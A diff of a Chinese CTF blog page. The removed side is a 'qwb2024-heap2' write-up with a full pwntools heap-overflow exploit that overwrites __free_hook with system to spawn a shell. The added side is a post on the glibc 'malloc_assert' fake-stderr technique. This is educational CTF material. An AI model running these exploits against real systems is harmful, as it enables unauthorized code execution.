@@ -4,13 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="qwb2024-heap2, Hexo">
-    <meta name="description" content="
-base64：明文3倍数，密文4倍数；
-此时我们输入密文，如果不是4的整倍数，这里malloc分配空间会向下取整，但是到了真正解密的时候：
+    <meta name="keywords" content="malloc_assert, q1ming">
+    <meta name="description" content="思维导图
 
-
-直接一次+4，然后处理4个字节密文，转变成三字节明文，根本不考虑当前剩余字节数目，回想前面me">
+基本原理https://www.anquanke.com/post/id/235598
+https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +20,7 @@ base64：明文3倍数，密文4倍数；
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>qwb2024-heap2 | Hexo</title>
+    <title>malloc_assert | q1ming</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -69,7 +67,7 @@ base64：明文3倍数，密文4倍数；
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Hexo</span>
+                    <span class="logo-span">q1ming</span>
                 </a>
             </div>
             
@@ -173,7 +171,7 @@ base64：明文3倍数，密文4倍数；
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Hexo</div>
+        <div class="logo-name">q1ming</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -339,12 +337,12 @@ base64：明文3倍数，密文4倍数；
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">qwb2024-heap2</h1>
+                    <h1 class="description center-align post-title">malloc_assert</h1>
                 </div>
             </div>
         </div>
@@ -368,8 +366,8 @@ base64：明文3倍数，密文4倍数；
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Crypto/">
-                                <span class="chip bg-color">Crypto</span>
+                            <a href="/tags/Heap/">
+                                <span class="chip bg-color">Heap</span>
                             </a>
                         
                     </div>
@@ -384,7 +382,7 @@ base64：明文3倍数，密文4倍数；
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2025-01-15
+                    2025-01-16
                 </div>
                 
 
@@ -408,26 +406,37 @@ base64：明文3倍数，密文4倍数；
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><img src="/images/1733461549984.png" alt="1733461549984"></p>
-<p>base64：明文3倍数，密文4倍数；</p>
-<p>此时我们输入密文，如果不是4的整倍数，这里malloc分配空间会向下取整，但是到了真正解密的时候：</p>
-<p><img src="/images/1733461644773.png" alt="1733461644773"></p>
-<p><img src="/images/1733461712393.png" alt="1733461712393"></p>
-<p>直接一次+4，然后处理4个字节密文，转变成三字节明文，根本不考虑当前剩余字节数目，回想前面<code>memset(s, 0, 0x400)</code>可以看到如果密文长度不足相当于用00补齐4字节；</p>
-<p>所以这里存在溢出，关键是如何构造；</p>
-<h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><p><img src="/images/1733462665961.png" alt="1733462665961"></p>
-<p><img src="/images/1733462682079.png" alt="1733462682079"></p>
-<p><img src="/images/1733462634970.png" alt="1733462634970"></p>
-<p>就是最后多出来的这个00字节导致无法控制溢出的第三个字节；</p>
-<p><img src="/images/1733463998627.png" alt="1733463998627"></p>
-<p>查找密文中的字符集中的字符，然后减去基地址得到偏移，最后用四个偏移拼起来就是3个字符；</p>
-<p>失败了的话返回末尾的指针，也就是有点越界的意思，然后sub以后得到0x41，这个似乎无可避免；</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>三的倍数溢出3字节，那么可以构造一个在堆上只溢出两字节、甚至一字节！</p>
-<p>也就是0xn6是三的倍数，0x36就行了，对应的密文应该是0x48然后+2</p>
-<p>利用最后多出来的一个固定字节构造overlap即可！</p>
-<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p><img src="/images/1733465906774.png" alt="1733465906774"></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">import</span> base64<br><br><br>file = <span class="hljs-string">&quot;./pwn&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;l&#x27;</span>:<br>    sh = process(file)<br><span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;r&#x27;</span>:<br>    sh = remote(<span class="hljs-string">&quot;&quot;</span>, )<br>elf = ELF(file)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">string</span>):<br>    sh.recvuntil(string)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">con=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;r&#x27;</span>:<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(con, <span class="hljs-built_in">int</span>):<br>        con = <span class="hljs-string">&quot;b *$rebase(&quot;</span> + <span class="hljs-built_in">hex</span>(con)+<span class="hljs-string">&quot;)&quot;</span><br>    gdb.attach(sh, con)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">content</span>):<br>    sh.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">itr</span>():<br>    sh.interactive()<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_heap</span>():<br>    res = <span class="hljs-number">0</span><br>    res = u64(sh.recvuntil(<span class="hljs-string">&quot;\x55&quot;</span>, timeout=<span class="hljs-number">0.2</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">if</span> res == <span class="hljs-number">0</span>:<br>        res = u64(sh.recvuntil(<span class="hljs-string">&quot;\x56&quot;</span>, timeout=<span class="hljs-number">0.2</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_libc</span>():<br>    res = <span class="hljs-number">0</span><br>    res = u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>, timeout=<span class="hljs-number">0.2</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">if</span> res == <span class="hljs-number">0</span>:<br>        res = u64(sh.recvuntil(<span class="hljs-string">&quot;\x7e&quot;</span>, timeout=<span class="hljs-number">0.2</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_tcache</span>():<br>    res = u64(sh.recvuntil(<span class="hljs-string">&quot;\x05&quot;</span>)[-<span class="hljs-number">5</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">num</span>):<br>    ru(<span class="hljs-string">&quot;choice:&quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(num))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add1</span>(<span class="hljs-params">con</span>):<br>    choice(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&quot;Enter the text to decode:&quot;</span>)<br>    con = base64.b64decode(con)<br>    sh.send(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add2</span>(<span class="hljs-params">con</span>):<br>    choice(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&quot;Enter the text to decode:&quot;</span>)<br>    length = <span class="hljs-built_in">len</span>(con)<br>    con = base64.b64encode(con)<br>    sh.send(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free2</span>(<span class="hljs-params">idx</span>):<br>    choice(<span class="hljs-number">4</span>)<br>    ru(<span class="hljs-string">&quot;idx&quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    choice(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&quot;Enter the text to decode:&quot;</span>)<br>    con = <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x4a</span><br>    sh.send(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    choice(<span class="hljs-number">6</span>)<br>    ru(<span class="hljs-string">&quot;idx&quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>    <br>    add2(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>) <span class="hljs-comment">#0</span><br>    add2(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#1</span><br>    add2(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>) <span class="hljs-comment">#2</span><br>    free2(<span class="hljs-number">0</span>)<br>    attack()<br>    add2(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>) <span class="hljs-comment">#0</span><br>    add2(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x280</span>) <span class="hljs-comment">#3</span><br>    add2(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x280</span>) <span class="hljs-comment">#4</span><br>    add2(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>) <span class="hljs-comment">#5</span><br>    add2(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>    free2(<span class="hljs-number">1</span>)<br>    pay = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x50</span>+<span class="hljs-number">0x110</span>+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x291</span>)<br>    pay = pay.ljust(<span class="hljs-number">0x70</span>)<br>    add2(pay) <span class="hljs-comment">#1</span><br>    free2(<span class="hljs-number">2</span>)<br><br>    add2(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>)<br>    show(<span class="hljs-number">3</span>)<br>    addr = get_libc()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;addr :&quot;</span>, <span class="hljs-built_in">hex</span>(addr))<br>    system = addr - <span class="hljs-number">0x19a950</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>    base = system - libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base :&quot;</span>, <span class="hljs-built_in">hex</span>(base))<br>    pause()<br><br>    free2(<span class="hljs-number">5</span>)<br>    free2(<span class="hljs-number">4</span>)<br>    free_hook = base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    pay = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x110</span>+p64(free_hook-<span class="hljs-number">0x278</span>)<br>    add2(pay)<br><br>    pay = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x278</span>+p64(system)<br>    add2(pay)<br>    add2(pay)<br>    <br>    free2(<span class="hljs-number">7</span>)<br>    <br>    sh.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    func()<br><br></code></pre></td></tr></table></figure>
+                <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="/images/1707895587701.png"></p>
+<p><img src="/images/1707895671383.png"></p>
+<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235598">https://www.anquanke.com/post/id/235598</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%82-pwn-writeup/">https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%82-pwn-writeup/</a></p>
+<h2 id="基本做法"><a href="#基本做法" class="headerlink" title="基本做法"></a>基本做法</h2><ol>
+<li><p>在一片已知地址的内存空间中部署和house_of_apple2略有不同的fake_struct；</p>
+</li>
+<li><p>让stderr指向这片内存；</p>
+</li>
+<li><p>修改top_chunk的size使之很小不满足malloc需求，且不满足top_chunk的页对齐；</p>
+</li>
+<li><p>malloc触发assert；</p>
+</li>
+</ol>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>当malloc等函数申请内存空间，且用到了top_chunk、而top_chunk的size较小不能满足需求的时候，就要重新分配空间，这个时候会查看top_chunk的size，判度胺是否页对齐，如果不对齐，就会触发<code>__malloc_assert</code>，则会有如下调用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__malloc_assert()<br>	__fxprintf()<br>		locked_vfxprintf()<br>			__vfprintf_internal()		<br></code></pre></td></tr></table></figure>
 
+<p>其中在<code>__fxprintf+208</code>的位置会有如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">0x00007fee65e7e8d0 &lt;+208&gt;:	mov    rdi,QWORD PTR [rbx+0x88] ;这里是重点<br></code></pre></td></tr></table></figure>
+
+<p>后边就和house_of_apple的利用链一样了；</p>
+<p>下面是<code>__fxprintf</code>函数的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function __fxprintf:<br>=&gt; 0x00007fee65e7e800 &lt;+0&gt;:	endbr64 <br>   0x00007fee65e7e804 &lt;+4&gt;:	push   rbp<br>   0x00007fee65e7e805 &lt;+5&gt;:	push   rbx<br>   0x00007fee65e7e806 &lt;+6&gt;:	mov    rbx,rdi ;这里一个<br>   0x00007fee65e7e809 &lt;+9&gt;:	sub    rsp,0xe8<br>   0x00007fee65e7e810 &lt;+16&gt;:	mov    QWORD PTR [rsp+0x40],rdx<br>   0x00007fee65e7e815 &lt;+21&gt;:	mov    QWORD PTR [rsp+0x48],rcx<br>   0x00007fee65e7e81a &lt;+26&gt;:	mov    QWORD PTR [rsp+0x50],r8<br>   0x00007fee65e7e81f &lt;+31&gt;:	mov    QWORD PTR [rsp+0x58],r9<br>   0x00007fee65e7e824 &lt;+36&gt;:	test   al,al<br>   0x00007fee65e7e826 &lt;+38&gt;:	je     0x7fee65e7e862 &lt;__fxprintf+98&gt;<br>   0x00007fee65e7e828 &lt;+40&gt;:	movaps XMMWORD PTR [rsp+0x60],xmm0<br>   0x00007fee65e7e82d &lt;+45&gt;:	movaps XMMWORD PTR [rsp+0x70],xmm1<br>   0x00007fee65e7e832 &lt;+50&gt;:	movaps XMMWORD PTR [rsp+0x80],xmm2<br>   0x00007fee65e7e83a &lt;+58&gt;:	movaps XMMWORD PTR [rsp+0x90],xmm3<br>   0x00007fee65e7e842 &lt;+66&gt;:	movaps XMMWORD PTR [rsp+0xa0],xmm4<br>   0x00007fee65e7e84a &lt;+74&gt;:	movaps XMMWORD PTR [rsp+0xb0],xmm5<br>   0x00007fee65e7e852 &lt;+82&gt;:	movaps XMMWORD PTR [rsp+0xc0],xmm6<br>   0x00007fee65e7e85a &lt;+90&gt;:	movaps XMMWORD PTR [rsp+0xd0],xmm7<br>   0x00007fee65e7e862 &lt;+98&gt;:	mov    rax,QWORD PTR fs:0x28<br>   0x00007fee65e7e86b &lt;+107&gt;:	mov    QWORD PTR [rsp+0x28],rax<br>   0x00007fee65e7e870 &lt;+112&gt;:	xor    eax,eax<br>   0x00007fee65e7e872 &lt;+114&gt;:	lea    rax,[rsp+0x100]<br>   0x00007fee65e7e87a &lt;+122&gt;:	mov    DWORD PTR [rsp+0x10],0x10<br>   0x00007fee65e7e882 &lt;+130&gt;:	mov    QWORD PTR [rsp+0x18],rax<br>   0x00007fee65e7e887 &lt;+135&gt;:	lea    rax,[rsp+0x30]<br>   0x00007fee65e7e88c &lt;+140&gt;:	mov    DWORD PTR [rsp+0x14],0x30<br>   0x00007fee65e7e894 &lt;+148&gt;:	mov    QWORD PTR [rsp+0x20],rax<br>   0x00007fee65e7e899 &lt;+153&gt;:	test   rbx,rbx<br>   0x00007fee65e7e89c &lt;+156&gt;:	je     0x7fee65e7e950 &lt;__fxprintf+336&gt;<br>   0x00007fee65e7e8a2 &lt;+162&gt;:	mov    eax,DWORD PTR [rbx]<br>   0x00007fee65e7e8a4 &lt;+164&gt;:	and    eax,0x8000<br>   0x00007fee65e7e8a9 &lt;+169&gt;:	jne    0x7fee65e7e8df &lt;__fxprintf+223&gt;<br>   0x00007fee65e7e8ab &lt;+171&gt;:	mov    rbp,QWORD PTR fs:0x10<br>   0x00007fee65e7e8b4 &lt;+180&gt;:	mov    rdi,QWORD PTR [rbx+0x88]<br>   0x00007fee65e7e8bb &lt;+187&gt;:	cmp    rbp,QWORD PTR [rdi+0x8]<br>   0x00007fee65e7e8bf &lt;+191&gt;:	je     0x7fee65e7e8db &lt;__fxprintf+219&gt;<br>   0x00007fee65e7e8c1 &lt;+193&gt;:	mov    edx,0x1<br>   0x00007fee65e7e8c6 &lt;+198&gt;:	lock cmpxchg DWORD PTR [rdi],edx<br>   0x00007fee65e7e8ca &lt;+202&gt;:	jne    0x7fee65e7e960 &lt;__fxprintf+352&gt;<br>   0x00007fee65e7e8d0 &lt;+208&gt;:	mov    rdi,QWORD PTR [rbx+0x88] ;这里是重点<br>   0x00007fee65e7e8d7 &lt;+215&gt;:	mov    QWORD PTR [rdi+0x8],rbp<br>   0x00007fee65e7e8db &lt;+219&gt;:	add    DWORD PTR [rdi+0x4],0x1<br>   0x00007fee65e7e8df &lt;+223&gt;:	xor    ecx,ecx<br>   0x00007fee65e7e8e1 &lt;+225&gt;:	lea    rdx,[rsp+0x10]<br>   0x00007fee65e7e8e6 &lt;+230&gt;:	mov    rdi,rbx<br>   0x00007fee65e7e8e9 &lt;+233&gt;:	call   0x7fee65e7e560 &lt;locked_vfxprintf&gt;<br>   0x00007fee65e7e8ee &lt;+238&gt;:	test   DWORD PTR [rbx],0x8000<br>   0x00007fee65e7e8f4 &lt;+244&gt;:	jne    0x7fee65e7e90a &lt;__fxprintf+266&gt;<br>   0x00007fee65e7e8f6 &lt;+246&gt;:	mov    rdi,QWORD PTR [rbx+0x88]<br>   0x00007fee65e7e8fd &lt;+253&gt;:	mov    ecx,DWORD PTR [rdi+0x4]<br>   0x00007fee65e7e900 &lt;+256&gt;:	lea    edx,[rcx-0x1]<br>   0x00007fee65e7e903 &lt;+259&gt;:	mov    DWORD PTR [rdi+0x4],edx<br>   0x00007fee65e7e906 &lt;+262&gt;:	test   edx,edx<br>   0x00007fee65e7e908 &lt;+264&gt;:	je     0x7fee65e7e928 &lt;__fxprintf+296&gt;<br>   0x00007fee65e7e90a &lt;+266&gt;:	mov    rdx,QWORD PTR [rsp+0x28]<br>   0x00007fee65e7e90f &lt;+271&gt;:	sub    rdx,QWORD PTR fs:0x28<br>   0x00007fee65e7e918 &lt;+280&gt;:	jne    0x7fee65e7e974 &lt;__fxprintf+372&gt;<br>   0x00007fee65e7e91a &lt;+282&gt;:	add    rsp,0xe8<br>   0x00007fee65e7e921 &lt;+289&gt;:	pop    rbx<br>   0x00007fee65e7e922 &lt;+290&gt;:	pop    rbp<br>   0x00007fee65e7e923 &lt;+291&gt;:	ret    <br>   0x00007fee65e7e924 &lt;+292&gt;:	nop    DWORD PTR [rax+0x0]<br>   0x00007fee65e7e928 &lt;+296&gt;:	mov    QWORD PTR [rdi+0x8],0x0<br>   0x00007fee65e7e930 &lt;+304&gt;:	xchg   DWORD PTR [rdi],edx<br>   0x00007fee65e7e932 &lt;+306&gt;:	cmp    edx,0x1<br>   0x00007fee65e7e935 &lt;+309&gt;:	jle    0x7fee65e7e90a &lt;__fxprintf+266&gt;<br>   0x00007fee65e7e937 &lt;+311&gt;:	mov    DWORD PTR [rsp+0x8],eax<br>   0x00007fee65e7e93b &lt;+315&gt;:	call   0x7fee65e91300 &lt;__GI___lll_lock_wake_private&gt;<br>   0x00007fee65e7e940 &lt;+320&gt;:	mov    eax,DWORD PTR [rsp+0x8]<br>   0x00007fee65e7e944 &lt;+324&gt;:	jmp    0x7fee65e7e90a &lt;__fxprintf+266&gt;<br>   0x00007fee65e7e946 &lt;+326&gt;:	cs nop WORD PTR [rax+rax*1+0x0]<br>   0x00007fee65e7e950 &lt;+336&gt;:	mov    rax,QWORD PTR [rip+0x19b551]        # 0x7fee66019ea8<br>   0x00007fee65e7e957 &lt;+343&gt;:	mov    rbx,QWORD PTR [rax];先调到这里来取_IO_2_1_stderr<br>   0x00007fee65e7e95a &lt;+346&gt;:	jmp    0x7fee65e7e8a2 &lt;__fxprintf+162&gt;<br>   0x00007fee65e7e95f &lt;+351&gt;:	nop<br>   0x00007fee65e7e960 &lt;+352&gt;:	mov    QWORD PTR [rsp+0x8],rsi<br>   0x00007fee65e7e965 &lt;+357&gt;:	call   0x7fee65e91230 &lt;__GI___lll_lock_wait_private&gt;<br>   0x00007fee65e7e96a &lt;+362&gt;:	mov    rsi,QWORD PTR [rsp+0x8]<br>   0x00007fee65e7e96f &lt;+367&gt;:	jmp    0x7fee65e7e8d0 &lt;__fxprintf+208&gt;<br>   0x00007fee65e7e974 &lt;+372&gt;:	call   0x7fee65f36550 &lt;__stack_chk_fail&gt;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="关于stderr"><a href="#关于stderr" class="headerlink" title="关于stderr"></a>关于stderr</h2><p>在许多题目的经验中，我们会发现往往有两个stderr的诡异现象；</p>
+<p>在2024年2月份的异常NSSCTF中，就遇到了这样的事情：</p>
+<p>![]1707896656574](&#x2F;images&#x2F;1707896656574.png)</p>
+<p>在<code>__fxprintf</code>+343的地方rax使用的是elf空间的stderr；</p>
+<p>针对这种情况，笔者的做法是将fake_strcut部署在了<code>_IO_2_1_stderr_</code>中，最终get_shell；</p>
 
                 
             </div>
@@ -444,7 +453,7 @@ base64：明文3倍数，密文4倍数；
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
+                    <a href="/about" rel="external nofollow noreferrer">q1ming</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -454,7 +463,7 @@ base64：明文3倍数，密文4倍数；
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2025/01/15/qwb2024-heap2/">http://example.com/2025/01/15/qwb2024-heap2/</a>
+                    <a href="http://example.com/2025/01/16/assert/">http://example.com/2025/01/16/assert/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -467,7 +476,7 @@ base64：明文3倍数，密文4倍数；
                     All articles in this blog are used except for special statements
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     reprint policy. If reproduced, please indicate source
-                    <a href="/about" target="_blank">John Doe</a>
+                    <a href="/about" target="_blank">q1ming</a>
                     !
                 </span>
             </div>
@@ -492,8 +501,8 @@ base64：明文3倍数，密文4倍数；
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Crypto/">
-                                    <span class="chip bg-color">Crypto</span>
+                                <a href="/tags/Heap/">
+                                    <span class="chip bg-color">Heap</span>
                                 </a>
                             
                         </div>
@@ -576,13 +585,13 @@ base64：明文3倍数，密文4倍数；
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2025/01/15/rsa/">
+                <a href="/2025/01/16/base64/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="RSA">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="base64">
                         
-                        <span class="card-title">RSA</span>
+                        <span class="card-title">base64</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -593,12 +602,12 @@ base64：明文3倍数，密文4倍数；
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-15
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-16
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            q1ming
                             
                         </span>
                     </div>
@@ -621,13 +630,13 @@ base64：明文3倍数，密文4倍数；
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/01/15/base64/">
+                <a href="/2025/01/14/CVE-2021-3493/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="base64">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="CVE-2023-3493">
                         
-                        <span class="card-title">base64</span>
+                        <span class="card-title">CVE-2023-3493</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -638,12 +647,12 @@ base64：明文3倍数，密文4倍数；
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-14
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            q1ming
                             
                         </span>
                     </div>
@@ -651,8 +660,12 @@ base64：明文3倍数，密文4倍数；
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Crypto/">
-                        <span class="chip bg-color">Crypto</span>
+                    <a href="/tags/kernel/">
+                        <span class="chip bg-color">kernel</span>
+                    </a>
+                    
+                    <a href="/tags/CVE/">
+                        <span class="chip bg-color">CVE</span>
                     </a>
                     
                 </div>
@@ -843,7 +856,7 @@ base64：明文3倍数，密文4倍数；
             
                 <span id="year">2019-2025</span>
             
-            <a href="/about" target="_blank">John Doe</a>
+            <a href="/about" target="_blank">q1ming</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             
